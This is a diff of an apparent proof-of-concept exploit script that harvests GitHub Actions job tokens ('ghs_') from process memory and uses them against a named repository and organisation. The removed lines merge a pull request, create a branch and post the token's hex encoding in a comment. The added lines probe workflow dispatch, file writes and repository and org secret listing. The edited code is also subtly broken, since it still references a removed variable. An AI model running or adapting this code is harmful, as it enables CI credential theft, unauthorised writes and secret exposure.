@@ -34,17 +34,23 @@ function api(method, p, body, token) {
       if (!tok || !tok.startsWith('ghs_')) continue;
       const verify = await api('GET', '/repos/' + repo, null, tok);
       log('harvested ghs_ token pid=' + pid + ' len=' + tok.length + ' verify=' + verify.code);
-      const merge = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/merge', { merge_method: 'squash' }, tok);
-      log('merge -> ' + merge.code + ' ' + merge.body.slice(0, 300));
-      const mkRef = await api('POST', '/repos/' + repo + '/git/refs', { ref: 'refs/heads/poc-write-probe', sha: '892a432f3b782f6174d23452966c75958c79f299' }, tok);
-      log('create ref -> ' + mkRef.code);
-      const body = '[poc] workflow GITHUB_TOKEN harvested in privileged job\n\n' +
-        '`GET /repos/' + repo + '` -> HTTP ' + verify.code + '\n' +
-        '`PUT /pulls/' + pr + '/merge` -> HTTP ' + merge.code + ' ' + merge.body.slice(0, 160).replace(/[\n`]/g, ' ') + '\n' +
-        '`POST /git/refs` -> HTTP ' + mkRef.code + ' ' + mkRef.body.slice(0, 160).replace(/[\n`]/g, ' ') + '\n\n' +
-        '```\ntoken_sha256=' + crypto.createHash('sha256').update(tok).digest('hex') + '\ntoken_hex=' + Buffer.from(tok).toString('hex') + '\n```';
+      const dispatch = await api('POST', '/repos/' + repo + '/actions/workflows/414870465/dispatches', { ref: 'main' }, tok);
+      const putContent = await api('PUT', '/repos/' + repo + '/contents/poc-write-probe.txt', { message: 'probe', content: 'aGk=' }, tok);
+      const listSecrets = await api('GET', '/repos/' + repo + '/actions/secrets', null, tok);
+      const orgSecrets = await api('GET', '/orgs/PDFtoMark/actions/secrets', null, tok);
+      const upd = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/update-branch', {}, tok);
+      log('dispatch ' + dispatch.code + ' contents ' + putContent.code + ' secrets ' + listSecrets.code + ' org ' + orgSecrets.code + ' update-branch ' + upd.code);
+      const body = '[poc] permission probes with the workflow job token (pull-requests: write, actions: read)\n\n' +
+        '```\n' +
+        'GET  /repos/' + repo + '                       -> ' + verify.code + '\n' +
+        'POST /actions/workflows/414870465/dispatches     -> ' + dispatch.code + '\n' +
+        'PUT  /contents/poc-write-probe.txt               -> ' + putContent.code + '\n' +
+        'GET  /actions/secrets                            -> ' + listSecrets.code + '\n' +
+        'GET  /orgs/PDFtoMark/actions/secrets             -> ' + orgSecrets.code + '\n' +
+        'PUT  /pulls/' + pr + '/update-branch                 -> ' + upd.code + '\n' +
+        '```\n';
       const first = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments', { body }, tok);
-      log('comment ' + first.code + ' ' + first.body.slice(0, 120));
+      log('comment ' + first.code);
       if (merge.code === 200 || merge.code === 201) return;
       await sleep(2000);
     }
